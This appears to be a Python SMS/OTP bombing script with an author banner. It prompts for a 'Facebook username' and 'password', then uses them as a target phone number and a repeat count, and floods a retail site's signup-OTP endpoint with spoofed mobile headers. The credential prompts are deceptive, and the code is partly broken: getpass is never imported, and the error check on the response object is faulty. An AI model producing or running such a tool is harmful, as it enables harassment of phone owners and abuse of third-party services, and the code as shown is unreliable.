import json
import requests
import os
import sys


def main():
	os.system('clear')
	os.system('figlet jankontohodd')
	banner='''
	[+]AUTHOR:Jank Ontohodd
	[+]Facebook : Jank Ontohodd
	'''
	print(banner)
	username = input(' PI Enter Your Facebook username : ')
	passwd = getpass(' Enter Your Facebook password : ')


	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': username
	}

	for x in range (int(passwd)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
		if 'eror' in leosureo:
			print('gagal Mengirim ' + username)

		else:
			print('succes mengirim ' + username)



main()
